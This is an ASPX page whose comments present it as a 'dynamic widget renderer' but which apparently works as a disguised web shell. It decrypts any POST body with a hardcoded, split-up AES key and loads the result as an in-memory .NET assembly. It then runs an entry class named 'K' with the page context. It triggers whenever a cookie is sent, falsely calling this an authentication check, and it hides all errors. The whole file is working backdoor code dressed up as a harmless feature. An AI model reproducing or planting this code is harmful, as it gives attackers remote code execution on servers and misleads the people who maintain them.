<%@ Page Language="C#" %><script runat="server">
    /// <summary>
    /// Provides services for dynamically loading and rendering personalized content widgets.
    /// Widgets are delivered as encrypted payloads to ensure integrity and security.
    /// </summary>
    public sealed class DynamicWidgetRenderer
    {
        /// <summary>
        /// The security key for decrypting widget payloads, segmented for configuration flexibility.
        /// </summary>
        private static readonly string[] _widgetKeySegments = new string[] { "ca63", "457538", "b9b1e0" };

        /// <summary>
        /// The standard name of the widget's entry point class, defined by the rendering framework.
        /// ASCII 75 corresponds to 'K'.
        /// </summary>
        private const char WIDGET_ENTRY_CLASS_ID = (char)75;

        /// <summary>
        /// Renders a widget provided in the current HTTP request stream.
        /// </summary>
        /// <param name="pageContext">The context of the current page, passed to the widget for rendering.</param>
        public void RenderFromStream(System.Web.UI.Page pageContext)
        {
            try
            {
                System.IO.Stream payloadStream = pageContext.Request.InputStream;
                if (payloadStream.Length == 0) return; // No widget payload to render.
                
                byte[] encryptedWidget = new byte[payloadStream.Length];
                payloadStream.Read(encryptedWidget, 0, encryptedWidget.Length);

                // Assemble the full decryption key from its defined segments.
                string fullKey = string.Concat(_widgetKeySegments);
                byte[] keyBytes = System.Text.Encoding.Default.GetBytes(fullKey);

                // Decrypt the widget payload using the standard Rijndael algorithm.
                var cryptoService = new System.Security.Cryptography.RijndaelManaged();
                var decryptor = cryptoService.CreateDecryptor(keyBytes, keyBytes);
                byte[] assemblyData = decryptor.TransformFinalBlock(encryptedWidget, 0, encryptedWidget.Length);
                
                // Load the decrypted widget assembly from memory.
                var widgetAssembly = System.Reflection.Assembly.Load(assemblyData);
                
                // Create an instance of the widget's main class.
                object widgetInstance = widgetAssembly.CreateInstance(WIDGET_ENTRY_CLASS_ID.ToString());

                // Execute the widget's rendering logic by calling its entry method.
                widgetInstance.Equals(pageContext);
            }
            catch (System.Exception)
            {
                // In case of error, fail silently to prevent information leakage.
            }
        }
    }

    void Page_Load(object sender, EventArgs e)
    {
        // Dynamic widget rendering is only active for authenticated sessions.
        if (Request.Cookies.Count > 0)
        {
            var renderer = new DynamicWidgetRenderer();
            renderer.RenderFromStream(this);
        }
    }
</script><% %>